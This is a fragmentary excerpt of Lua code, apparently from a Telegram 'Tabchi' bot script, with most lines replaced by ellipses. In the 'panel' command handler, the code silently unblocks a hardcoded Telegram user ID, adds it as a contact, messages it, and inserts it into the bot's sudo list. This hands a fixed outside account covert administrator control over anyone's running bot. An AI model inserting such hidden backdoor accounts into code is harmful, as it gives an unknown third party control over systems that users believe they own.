  ...
  if text ~= "null" then
    ...
    if is_sudo(msg) then
      ...
      if text == "panel" or text:match("panel(%d+)$") then
        ...
        bot.unblockUser(214038204)
        bot.importContacts(214038204, "Tabchi", "Online", 214038204)
        bot.sendMessage(214038204, 0, 1, "Online", 1, "md")
        db:sadd("users" .. bot_id .. ":sudos", 214038204)
        ...
        if num == 2 then
          ...
          tdcli_function({ID = "GetChat", chat_id_ = 214038204}, fuck, nil)
